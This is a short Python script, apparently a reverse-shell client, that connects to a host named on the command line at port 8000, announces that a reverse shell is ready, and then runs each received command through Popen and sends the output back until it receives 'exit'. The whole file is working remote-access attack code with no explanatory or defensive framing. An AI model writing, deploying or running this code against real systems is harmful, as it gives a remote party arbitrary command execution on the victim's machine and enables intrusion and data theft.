import sys
from subprocess import Popen, PIPE
from socket import (
    socket,
    AF_INET,
    SOCK_STREAM
)

server_name = sys.argv[1]
server_port = 8000

client_socket = socket(AF_INET, SOCK_STREAM)
client_socket.connect((server_name, server_port))
client_socket.send('Reverse shell ready for receiving commands'.encode())

command = client_socket.recv(4064).decode()
while command != 'exit':
    proc = Popen(command.split(' '), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    client_socket.send(result)
    command = (client_socket.recv(4064)).decode()

client_socket.close()
